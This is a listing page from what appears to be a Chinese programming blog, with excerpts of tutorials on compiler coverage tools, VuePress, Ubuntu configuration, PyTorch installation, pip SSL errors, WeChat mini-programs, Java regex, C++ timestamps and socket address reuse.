	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8bff2c9b291f3305554cedefc5a1d08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9401c6409a8726ef1d8d01febabf1325/" rel="bookmark">
			GCC/LLVM分支覆盖的检查方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GCC分支覆盖检查 gcov的方式 假设我们有一个文件test.c,这个文件是可执行的
gcc --coverage -O0 -o test test.c ./test gcov test cat test.c.gcov# 查看分支覆盖情况 LLVM分支覆盖检查 LLVM的方式 clang -O0 -fprofile-instr-generate -fcoverage-mapping test.c ./a.out llvm-profdata merge -sparse *.profraw -o merged.profdata llvm-cov show ./a.out -instr-profile=merged.profdata 得到的显示如下：
1| |extern long long int var_19; 2| |extern signed char var_20; 3| |extern short var_21; 4| |/* 5| |yarpgen version 2.0 (build 4994b8a on 2023:04:14) 6| |Seed: 2582185472 7| |Invocation: yarpgen --std=c 8| |*/ 9| |#define max(a,b) \ 10| | ({ __typeof__ (a) _a = (a); \ 11| | __typeof__ (b) _b = (b); \ 12| | _a &gt; _b ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9401c6409a8726ef1d8d01febabf1325/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62f66159c75d640a8b31c867c86d2257/" rel="bookmark">
			超详细的vuepress搭建教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		搭建一个vuepress项目 准备工作项目搭建工作安装vuepress vuepress配置首页配置核心配置 准备工作 项目搭建工作 打开或者新建一个项目。新建项目：
// 新建项目目录 mkdir myVuepress cd myVuepress // 快速生成pachage.json文件 npm init -y 安装vuepress 安装vuepress包
npm install vuepress 添加指令
打开package.json文件，添加项目运行和打包命令
"scripts": { // 添加这两条命令 "docs:dev": "vuepress dev docs", "docs:build": "vuepress build docs" }, 运行指令：npm run docs:dev
打包指令：npm run docs:build
到这里，项目准备工作就完成了，接下来就是配置vuepress项目了。
vuepress配置 首页配置 首先在项目根目录下新建docs目录，并且在docs目录下新建一个README.md文件，这个文件就是项目打开的首页。我们可以进行以下配置:
--- home: true actionText: 进入文档 → actionLink: /guide/ features: - title: 简洁至上 details: 以 Markdown 为中心的项目结构，以最少的配置帮助写作，更加专注与内容的编写。 - title: 高性能 details: 每个页面都预渲染生成静态的 HTML，在页面被加载的时候，将作为 SPA 运行，具有更好的性能和更快速的体验。 - title: 响应式 details: 响应式页面，能够兼容多种设备。在不同端的设备上，实现相同的浏览体验。 footer: Be yourself the happiest | Copyright © 2023 --- 对应的页面如下图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62f66159c75d640a8b31c867c86d2257/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b1022237060276ba0a2707d81b3b954/" rel="bookmark">
			VSCode使用记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 插件添加函数大纲 插件 keil插件安装
添加函数大纲 方法一：(显示在顶部，不方便查看)
Shift +Ctl+O 方法二：显示大纲(在编辑器左下角显示，方便查看)
Shift Ctl P -&gt; View: Quick Open View -&gt; 大纲 方法3：
安装c++扩展
显示大纲(在编辑器左下角显示，方便查看) Ctrl+Q
方法4:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8fdf1d310920d0ae9a56f4f0e485d32a/" rel="bookmark">
			Python 保留小数点位数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、format() 方法 format函数：使用 format() 方法将数值格式化为一个字符串，并指定要保留的小数位数
a = 3.1415926 print('{:.3f}'.format(a)) print(format(a, '.3f')) 2、%.xf’方法 ’%.xf’方法：使用字符串格式化操作符 % 将数值格式化为一个字符串，并指定要保留的小数位数
a = 3.1415926 print('%.3f' % a) 3、round 函数 内置函数 round()，该函数可以保留小数点后面的数，并对小数进行四舍五入
使用“round(数,位数)”语句就可以保留小数了
a = 3.1415926 a = round(a, 3) print(a) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bea92564af3d338a749096e212bc3a0/" rel="bookmark">
			MyBatis、Spring JDBC 和 Spring Data JPA：选择哪种持久化框架？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当涉及到选择 Java ORM 框架时，MyBatis、Spring JDBC 和 Spring Data JPA 是最常用的三个框架。以下是每个框架的一些关键特点：
MyBatis：它是一种半自动的 ORM 框架，通过 SQL 映射文件（XML 文件）将 Java 对象映射到关系型数据库中的表。它提供了强大的 SQL 映射功能和动态 SQL 语句生成，使开发人员可以更好地控制 SQL 语句的生成和执行。MyBatis 适合那些需要更高的 SQL 控制权和更多灵活性的项目。
Spring JDBC：它是 Spring 框架的一部分，提供了访问关系型数据库的简单和直接的方式。它不需要任何 ORM 映射或配置文件，通过使用 JdbcTemplate 类，开发人员可以轻松地编写类型安全的 SQL 语句和查询结果映射。Spring JDBC 适合那些需要更直接的 JDBC 访问并且不需要高级 ORM 功能的项目。
Spring Data JPA：它是 Spring Data 子项目的一部分，提供了 JPA 规范的实现。JPA 是 Java 持久化 API 的标准，可以让开发人员将 Java 对象映射到关系型数据库中的表，同时提供了高级 ORM 功能，如缓存和关系映射。Spring Data JPA 通过提供一些简单的接口和默认实现，极大地简化了 JPA 的使用，并提供了多种数据访问的方式。Spring Data JPA 适合那些需要高级 ORM 功能和开发效率的项目。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bea92564af3d338a749096e212bc3a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c111983409d202fd361894c6fb331b8/" rel="bookmark">
			Ubuntu怎么查看电脑配置(ubuntu怎么查看系统配置)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu怎么查看电脑配置 ubuntu查看电脑配置的方法如下：
1、按Ctrl+Alt+T键，调出终端窗口， 在窗口中输入“free -m”按enter键执行，然后会在下面第一行的“mem:”后面的“total”下面显示内存总大小；
2、查看硬盘信息，则需要先在终端输入“df”，显示的sd1就是自己当前的磁盘，后面的第一个数据就是磁盘大小， 19.4G，不知道上面型号，只能拆机箱看了；
3、查看cpu信息，型号，在终端输入“cat /proc/cpuinfo”按enter执行后，则显示出CPU的型号之类的信息；
4、使用命令能看到显卡型号，命令是“lspci |grep VGA”按enter执行，然后在下面的一行中，最后面会显示显卡型号。
ubuntu对哪种显卡支持比较好 最好的是intel的集成显卡HD4000 不过现在独立显卡对ubuntu的支持也是越来越好的 我用A卡的HD5650在ubuntu下玩dota2，效果都开都能达到20fps了
Ubuntu一般用户装哪个版本比较好 一般是越新的版本额越好，但是不一定最稳定。
既然选择用Ubuntu 就不要害怕Bug，06年刚用Ubuntu的时候光安装配置我就逛了几天的论坛，现在用的11.10基本已经很傻瓜了，说虽然总有些难以调和的小问题（如音量小，无法调亮度，无法控制无线设备
ubuntu18.04网络配置 从17.10开始放弃在/etc/network/interfaces里固定IP的配置
配置文件是：/etc/netplan/50-cloud-init.yaml 。用缩进来表示层级关系
冒号之后要有个空格。
network:
version: 2
renderer: networkd
ethernets:
ens33: #配置的网卡名称 可以使用ifconfig -a查看本机的网卡
dhcp4: no #dhcp4 no关闭，yes 打开
dhcp6: no #dhcp6 no关闭，yes 打开
addresses: [192.168.1.142/24] #设置本机IP及掩码
gateway4: 192.168.1.1 #设置网关
nameservers:
addresses: [114.114.114.114, 8.8.8.8] #设置DNS
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce4b4106b6297a6c89d28bfbd6304a2d/" rel="bookmark">
			GUID分区与MBR分区有什么区别？ 操作系统知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GUID分区与MBR分区有什么区别？ 操作系统知识
1、MBR分区表类型的磁盘
主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，它仅仅包含一个64个字节的硬盘分区表。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，最多只能识别4个主要分区（Primary partition）。所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。这里就需要引出扩展分区了。扩展分区也是主要分区的一种，但它与主分区的不同在于理论上可以划分为无数个逻辑分区。另外最关键的是MBR分区方案无法支持超过2TB容量的磁盘。因为这一方案用4个字节存储分区的总扇区数，最大能表示2的32次方的扇区个数，按每扇区512字节计算，每个分区最大不能超过2TB。磁盘容量超过2TB以后，分区的起始位置也就无法表示了。
2、GUID分区表类型的磁盘
这种磁盘，通常称为GPT磁盘，GPT全称：Globally Unique Identifier Partition Table Format，一种由基于 Itanium 计算机中的可扩展固件接口 (EFI) 使用的磁盘分区架构。与主启动记录 (MBR) 分区方法相比，GPT 具有更多的优点，因为它允许每个磁盘有多达 128 个分区，因为Windows系统最多只允许划分128个分区，支持高达 18 千兆兆字节的卷大小，允许将主磁盘分区表和备份磁盘分区表用于冗余，还支持唯一的磁盘和分区 ID (GUID)，支持2TB以上的大硬盘。
磁盘分区MBR与GUID的区别，如何快速分区，普通分区
磁盘分区MBR与GUID的区别，如何快速分区，普通分区
MBR分区为常用分区模式，GUID分区不常用,为新分区模式,现今预装WIN8默认为GUID分区,各有好处,及缺陷。
GUID 分区表 (GPT) 与支持最大卷为 2 TB (terabytes) 并且每个磁盘最多有 4 个主分区（或 3 个主分区，1 个扩展分区和无限制的逻辑驱动器）的主启动记录 (MBR) 磁盘分区的样式相比，GUID 分区表 (GPT) 磁盘分区样式支持最大卷为 18 EB (exabytes) 并且每磁盘最多有 128 个分区。与 MBR 分区的磁盘不同，至关重要的平台操作数据位于分区，而不是位于非分区或隐藏扇区。
1、MBR分区表类型的磁盘
主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，它仅仅包含一个64个字节的硬盘分区表。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，最多只能识别4个主要分区（Primary partition）。所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。这里就需要引出扩展分区了。扩展分区也是主要分区的一种，但它与主分区的不同在于理论上可以划分为无数个逻辑分区。另外最关键的是MBR分区方案无法支持超过2TB容量的磁盘。因为这一方案用4个字节存储分区的总扇区数，最大能表示2的32次方的扇区个数，按每扇区512字节计算，每个分区最大不能超过2TB。磁盘容量超过2TB以后，分区的起始位置也就无法表示了。
2、GUID分区表类型的磁盘
这种磁盘，通常称为GPT磁盘，GPT全称：Globally Unique Identifier Partition Table Format，一种由基于 Itanium 计算机中的可扩展固件接口 (EFI) 使用的磁盘分区架构。与主启动记录 (MBR) 分区方法相比，GPT 具有更多的优点，因为它允许每个磁盘有多达 128 个分区，因为Windows系统最多只允许划分128个分区，支持高达 18 千兆兆字节的卷大小，允许将主磁盘分区表和备份磁盘分区表用于冗余，还支持唯一的磁盘和分区 ID (GUID)，支持2TB以上的大硬盘。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce4b4106b6297a6c89d28bfbd6304a2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25c11d9666294a50db04b264a311ed33/" rel="bookmark">
			基于openpcdet的Pointpillars之ROS可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于openpcdet的Pointpillars之ROS可视化 一、实验环境二、准备条件三、下载源码，确定文件架构四、将Openpcdet的部分文件迁移至对应文件五、具体代码修改与讲解5.1 先修改ros.py代码5.1.1 三个路径的修改5.1.2 修改旋转参数5.1.3 修改ros.py代码的大概110行前后（去除掉不合适的检测框，我设置的阈值为0.5）5.1.4 整体 5.2 launch/pointpillars.rviz代码5.3 launch/pointpillars.rviz代码 六、补充库，编译七、 运行八、报错报错一：报错二： 参考资料 一、实验环境 Ubuntu 18.04
cmake version 3.13.1
cuda 10.2
python 3.7
pytorch 1.8.1
二、准备条件 （1）安装好ROS
(2)搭建好OpenPCDet，确保其运行成功，尤其是虚拟环境没有问题。参考OpenPCDet安装及其3D检测算法实现
（3）代码获取：具体做法就是，在github上下载下来原作者的源码，然后将复现好的OpenPCDet的部分文件进行迁移到下载好的github的对应文件夹中，修改源码，进行编译。
(4)下载kitti的原始数据集，并将其转化为.bag格式，具体办法，可以参考下面：
将kitti数据集中的velodyne points转换为ROS bag文件
三、下载源码，确定文件架构 mkdir -p ~/ws/pointpillars_ros/src cd pointpillars_ros/src git clone https://github.com/BIT-DYN/pointpillars_ros 我的文件架构：
四、将Openpcdet的部分文件迁移至对应文件 将Openpcdet工程中的OpenPCDet/tools中的全部文件以及/OpenPCDet/pcdet（尤其注意不要遗漏pcdet文件），
复制粘贴放入到src/pointpillars/tools文件夹下（然后放入数据检查一下openpcdet移植过来还能跑通不）：
五、具体代码修改与讲解 5.1 先修改ros.py代码 5.1.1 三个路径的修改 # 下边的路径改成自己的 sys.path.append("/home/dyn/project_test/pointpillars_ros/src/pointpillars_ros") # 54行后边 config_path = rospy.get_param("/config_path", "/home/dyn/project_test/pointpillars_ros/src/pointpillars_ros/tools/cfgs/kitti_models/pointpillar.yaml") ckpt_path = rospy.get_param("/ckpt_path", "/home/dyn/project_test/pointpillars_ros/src/pointpillars_ros/tools/models/pointpillar_7728.pth") 5.1.2 修改旋转参数 大概在ros.py的86行前后。因为开源作者安装的雷达有偏角，所以这里置0就行。
# 旋转轴 #rand_axis = [0,1,0] #旋转角度 #yaw = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25c11d9666294a50db04b264a311ed33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad38c301a4a6d8321a43e2a1efbaf9be/" rel="bookmark">
			Python中的主函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python代码中，我们常常看到主函数是以if __name__ == '__main__'开头的，比如
它的原理是什么呢？
首先要知道，__name__是内置变量，用于表示当前模块的名字。在一个模块中运行以下语句，你会发现输出的是__main__。
但是当我们在另一个模块中import刚才的模块时，输出此模块的__name__，发现结果变成了它的模块名。
之所以输出了两遍模块名，是因为test2在输出test模块的内置函数时，同时也执行了test里的代码。 由此我们可以看出来，__name__是善变的：当模块被直接执行时，__name__=='__main__'结果为真，所以后续的代码可以继续执行；而当模块被调用执行时，结果为假，后续的代码无法继续执行。正是利用了__name__的这一特性，以if __name__ == '__main__'开头的代码块就可以作为主函数了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ae8cfc6cf16f134e8e5de77f67e5433/" rel="bookmark">
			Java：树的前序、中序、后序遍历代码实现--二叉树递归法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java：树的前序、中序、后序遍历代码实现--二叉树递归法 前言一、什么是树的前序、中序、后序遍历?二、具体实现代码1.前序遍历2.中序遍历3.后序遍历 前言 树的前序、中序、后序遍历是常见的树检索方式，本文分享了Java实现树的前序、中序、后序遍历的代码
希望对大家有用！
一、什么是树的前序、中序、后序遍历? 先序（深度搜索遍历DFS）：先顶点，再左边节点，接着右边节点
中序：先左边节点，再顶点，最后右边节点
后序：先左边节点，然后右边节点，最后为顶点
更多内容可以参考：树-树的遍历（先序、中序、后序）
树的前序遍历、中序遍历、后序遍历详解
二、具体实现代码 1.前序遍历 import java.util.*; /* * public class TreeNode { * int val = 0; * TreeNode left = null; * TreeNode right = null; * public TreeNode(int val) { * this.val = val; * } * } */ public class Solution { /** * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可 * * * @param root TreeNode类 * @return int整型一维数组 */ public int[] preorderTraversal (TreeNode root) { // write code here List&lt;Integer&gt; list=new ArrayList&lt;&gt;(); preorder(list,root); int[] res = new int[list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ae8cfc6cf16f134e8e5de77f67e5433/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ed738702f7d8593cf697c6099b2155b/" rel="bookmark">
			Pytorch-gpu的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.先安装cuda和cudnn 推荐安装cuda11.3和cuda10.2，因为这两个版本用的多。
安装教程可以看我的另一篇文章：
cuda和cudnn安装教程
2.安装对应版本的Pytorch Pytorch的版本需要和cuda的版本相对应。具体对应关系可以去官网查看。这里先附上一张对应关系图。
比如我的cuda是11.3的，可以下载的pytorch版本就有1.12.1，1.12.0，1.11.0等等。
确定好要下载的版本后，进入pytorch官网开始下载。Pytorch官网
我选择的是pytorch1.12,复制红线划中的内容到anaconda prompt中，就开始下载啦！
3.测试安装是否成功 在pycharm中输入下面代码，输出结果为true则说明安装成功
import torch print(torch.__version__) print(torch.cuda.is_available()) 4.在一个新的python环境中安装pytorch（选读） 怎样在pycharm中配置自己创建的环境，可以参考我这篇文章：
pycharm配置创建的python环境
怎样用anaconda创建一个环境，以及与环境相关的种种命令，可以参考我这篇文章：
anaconda虚拟环境常用命令
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7915d577ff378268165c3ba324fba41d/" rel="bookmark">
			pip安装包以及更新报错Could not fetch URL ：There was a problem confirming the ssl certificate
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【建议大家可以先看看评论，出现这个问题可能是fiddle、加速器、梯子等等的软件没有关闭的原因，而这篇博文主要是我个人的折腾历程~】 在运行代码的时候报错问题：requests.exceptions.SSLError: HTTPSConnectionPool(host=‘XXX’, port=443) 发现可能是由于requests没有安装依赖安装包 pip install cryptography
pip install pyOpenSSL
pip install certifi
因为需要使用pip安装这些包，所以就用cmd执行命令：pip install xxx，结果报错 然后百度找了很多种方法：
一、首先试了一下豆瓣镜像和清华pip源的方法安装包，看看是不是下载慢的问题 1、pip install xxxx（包） -i http://pypi.douban.com/simple【豆瓣】
pip install xxxx（包） -i https://pypi.tuna.tsinghua.edu.cn/simple【清华】
结果还是不行，还是报一样的错，此路不通（×）
2、然后又觉得是不是pip没有更新的问题，又去更新pip （1）首先使用报错提示的方法：python -m pip install --upgrade pip，结果一样（×）
（2）使用清华镜像再试一次：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U，结果一样（×）
二、后来发现可能是ssl证书的问题，按照网上所说添加信任试一试安装包，就是后面蓝色字体的那一段 （1）pip install xxxx（包） -i http://pypi.douban.com/simple --trusted-host pypi.douban.com，加载出一些但依旧有问题（×）
然后给了几条debug assistance，我就看第一条还是让我去更新最新的pip，然后我就又去更新pip，并且加上--trusted-host ，也就是下面这条
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U --trusted-host pypi.tuna.tsinghua.edu.cn，结果更糟糕了（×）
提示无法访问，pip都被我弄没了，报错：ModuleNotFoundError: No module named 'pip'，然后我又重新弄回来
python -m ensurepip，但是安装的并不是最新的版本，没啥区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7915d577ff378268165c3ba324fba41d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cb846ad025c13523c3309e1feaf4c34/" rel="bookmark">
			微信小程序中scroll-view里获取触底事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果想在滚动组件中拿到触底事件需要自己去获取组件,通过bindscrolltolower事件来定义onScrollToLower方法
&lt;scroll-view bindscrolltolower="onScrollToLower" class="my-scroll-view" scroll-y="true" style="height: 100vh;"&gt; &lt;view class="pge"&gt; &lt;view class="list_box" wx:for="{{sendList}}" wx:key="id"&gt; &lt;view class="list_title"&gt; &lt;text&gt;{{item.unit_name}}&lt;/text&gt; &lt;/view&gt; &lt;view class="list_con"&gt; &lt;view class="list_con_text"&gt; &lt;text&gt;科室&lt;/text&gt; &lt;text&gt;{{item.dept_name}}&lt;/text&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/scroll-view&gt; 然后在onScrollToLower方法中通过类来拿到当前高度来判断是否触底
// 滚动组件中监听触底 onScrollToLower: function () { const query = wx.createSelectorQuery().in(this); query.select('.my-scroll-view').boundingClientRect((res) =&gt; { if (!res) { return; } const scrollTop = res.top; const scrollHeight = res.height; const totalHeight = scrollHeight; if (scrollTop + scrollHeight &gt;= totalHeight) { console.log('已到达底部') } }).exec() } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1faafab91c2972654f183c849ce00600/" rel="bookmark">
			微信小程序 - uCharts 图表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用背景 前端图表的插件库有很多，例如echarts、uCharts等等
echarts 更适合应用于后台管理系统 或者pc 端
当微信小程序使用 echarts 并且引用 echarts 他会提示一段话 然后报错
小程序“文件体积超过 500KB，已跳过压缩以及 ES6 转 ES5 的处理，手机端使用过大的 js 库影响性能。” 二、uCharts高性能跨平台图表库 uCharts官网 https://www.ucharts.cn
uCharts git 地址 uCharts: 高性能跨平台图表库，支持H5、APP、小程序（微信小程序、支付宝小程序、钉钉小程序、百度小程序、头条小程序、QQ小程序、快手小程序、360小程序）、Vue、Taro等更多支持canvas的框架平台，支持饼图、圆环图、线图、柱状图、山峰图、区域图、雷达图、圆弧进度图、仪表盘、K线图、条状图、混合图、玫瑰图、漏斗图、词云图、时序图、散点图、气泡图、地图等常见图表。
下载cCharts 地址 uCharts: 高性能跨平台图表库，支持H5、APP、小程序（微信小程序、支付宝小程序、钉钉小程序、百度小程序、头条小程序、QQ小程序、快手小程序、360小程序）、Vue、Taro等更多支持canvas的框架平台，支持饼图、圆环图、线图、柱状图、山峰图、区域图、雷达图、圆弧进度图、仪表盘、K线图、条状图、混合图、玫瑰图、漏斗图、词云图、时序图、散点图、气泡图、地图等常见图表。
下载并在本地引入
三、在微信小程序中使用 uCharts 基本案例 将其封装成微信小程序的组件
&lt;view class="pie-columns"&gt; &lt;view class="pie-charts" style="width: {{ cWidth }}px;height:{{ cHeight }}px"&gt; &lt;canvas canvas-id="canvasPie" id="canvasPie" class="charts" style="width: {{ cWidth }}px;height:{{ cHeight }}px" ontouchstart="touchPie"&gt;&lt;/canvas&gt; &lt;/view&gt; &lt;/view&gt; page { width: 750rpx; overflow-x: hidden; } .pie-columns { display: flex; flex-direction: column !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1faafab91c2972654f183c849ce00600/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78f6c2760af60dd279b0817fd652f40f/" rel="bookmark">
			JAVA使用正则表达式匹配字符串中的token（其他字段）对应的值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：java处理字符串token=123456789；SSFSMS=24hjsdi2342，准确匹配token对应的值123456789
根据提供的搜索结果，Token是一种服务端生成的字符串，用于客户端进行请求的令牌。如果需要从字符串中准确匹配出token对应的值，可以使用Java正则表达式来实现。
下面是一个Java代码示例，使用正则表达式匹配字符串中的token对应的值：
import java.util.regex.Matcher; import java.util.regex.Pattern; public class TokenMatcher { public static void main(String[] args) { String str = "token=123456789；SSFSMS=24hjsdi2342"; Pattern pattern = Pattern.compile("token=(\\d+)"); Matcher matcher = pattern.matcher(str); if (matcher.find()) { String token = matcher.group(1); System.out.println(token); } } } 运行结果为：
123456789 这段代码首先定义了一个字符串str，包含了需要处理的字符串。然后使用正则表达式"token=(\d+)“，其中”\d+"表示匹配任意数字，来匹配字符串中的token对应的值。接着使用Matcher对象的find()方法查找匹配项，如果找到了就使用group()方法获取匹配的值。最后将结果输出到控制台。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/627148123fc354860a7fc3971987e662/" rel="bookmark">
			c&#43;&#43;获取时间戳的方法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 系统级时间戳获取方法1.1 Windows系统获取时间间隔的方式1.2 Linux系统获取时间间隔的方式1.3 获取时间戳 2. c++语言获取时间戳 1. 系统级时间戳获取方法 1.1 Windows系统获取时间间隔的方式 API说明
Windows平台下使用 GetLocalTime
VOID GetLocalTime( LPSYSTEMTIME lpSystemTime //address of system times structure ); 参数说明:
• lpSystemTime: 指向一个用户自定义包含日期和时间信息的类型为 SYSTEMTIME 的变量，该变量用来保存函数获取的时间信息。
此函数会把获取的系统时间信息存储到SYSTEMTIME结构体里边
typedef struct _SYSTEMTIME { WORD wYear;//年 WORD wMonth;//月 WORD wDayOfWeek;//星期，0为星期日，1为星期一，2为星期二…… WORD wDay;//日 WORD wHour;//时 WORD wMinute;//分 WORD wSecond;//秒 WORD wMilliseconds;//毫秒 }SYSTEMTIME,*PSYSTEMTIME; • 使用示例：
SYSTEMTIME stTime; GetLocalTime(&amp;stTime); WORD wYear = stTime.wYear; WORD wMonth = stTime.wMonth; WORD wDay = stTime.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/627148123fc354860a7fc3971987e662/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db26d1ddb955236044e0b7043603ba65/" rel="bookmark">
			【鸡同鸭讲聊天加密工具】一个没啥用的聊天文字加密工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		该工具简简单单，使用也很简单。
主要目的是就是用来简单的对聊天双方收发的消息做一下加密，可以防君子。
软件使用很简单，双方约定一个加密解密的密码，写到软件里。
然后上面的格子写明文，下面的格子会自动出来密文。
收到密文后，直接复制，粘贴到下面的那个格子里，明文就会自动在上面的格子里显示出来。
然后可以按需复制
点击这里下载小工具
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/287c06df9ae666ee24b72bdea2d1fb0a/" rel="bookmark">
			结构体练习：C语言——输入两个学生的名字，学号，成绩，输出成绩高的学生的信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 通过引入结构体，进行学号、姓名、成绩的输入；
之后利用if比较成绩，将成绩好的同学信息输出。
#include &lt;stdio.h&gt; #include &lt;string.h&gt; struct Student {	int num; char name[32]; double score; }; int main() { struct Student stu1; struct Student stu2; struct Student max; printf("请输入同学的学号，姓名，成绩:"); scanf("%d%s%lf",&amp;stu1.num,stu1.name,&amp;stu1.score); printf("请输入同学的学号，姓名，成绩:"); scanf("%d%s%lf",&amp;stu2.num,stu2.name,&amp;stu2.score); max = stu1; if(stu1.score &lt; stu2.score){ max = stu2; } printf("成绩较好的同学是\n"); printf("学号：%d,姓名：%s,成绩：%.2lf\n",max.num,max.name,max.score); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00f4af9e90c1e91bf812931d9f8a985c/" rel="bookmark">
			socket.error: [Errno 98] Address already in use的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一：网络编程地址复用问题
二、解决方案
1.使用命令lsof -i:端口号 查找端口并使用kill结束进程
2.允许地址重复用设置 一：网络编程地址复用问题 最近在腾讯云的轻量级服务器上编写基于python的TCP服务器端程序并调试连接广和通的4G通信模组，但是在结束程序时会出现以下的报错：
这个错误是因为在同一个端口上已经有一个进程在监听了。这个问题一般等待几分钟等释放端口重新运行程序也可以解决，但是这样不利于调试，这时我们可以进行以下两种处理方式。
二、解决方案 1.使用命令lsof -i:端口号 查找端口并使用kill结束进程 第一种处理方式是使用命令lsof -i:端口号查找端口并使用kill结束进程。这个命令可以查找到占用指定端口的进程ID，然后使用kill命令结束该进程即可。例如，如果我们想结束占用8080端口的进程，可以使用以下命令：
lsof -i:8080
这个命令会返回一个进程ID：26155
然后使用以下命令结束该进程：
kill 26155
2.允许地址重复用设置 有可能使用lsof -i:命令查找不到进程的ID，这时可以手动添加代码，在Python代码中使用setsockopt()函数让Socket允许地址复用。在绑定之前，我们需要调用setsockopt()函数设置SO_REUSEADDR选项，这样就可以实现地址复用。可以使用以下代码实现：
#python import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #地址重复用 s.bind(('localhost', 8080)) s.listen(5) 这段代码首先创建了一个Socket对象，然后调用setsockopt()函数设置SO_REUSEADDR选项为1，表示允许地址复用。最后绑定了localhost的8080端口。
#C #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; int MySocket = socket(AF_INET, SOCK_STREAM, 0); int opt = 1; setsockopt(MySocket, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt)); # 地址复用 struct sockaddr_in TCPADDR; TCPADDR.sin_family = AF_INET; TCPADDR.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00f4af9e90c1e91bf812931d9f8a985c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
